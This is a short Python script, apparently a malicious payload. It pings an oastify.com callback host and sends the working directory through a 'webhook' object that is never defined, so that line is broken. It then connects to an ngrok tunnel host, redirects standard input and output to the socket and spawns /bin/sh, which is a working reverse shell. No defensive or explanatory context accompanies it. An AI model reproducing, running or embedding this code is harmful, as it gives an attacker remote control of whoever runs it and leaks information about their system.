import requests,sys,os,subprocess,socket,pty

requests.get("https://pwpd3g42ebsq3wznexhjlsxi2980wqkf.oastify.com")
name = os.getcwd()
webhook.send(f"OS-Info: {name}")

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("0.tcp.au.ngrok.io",16311))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")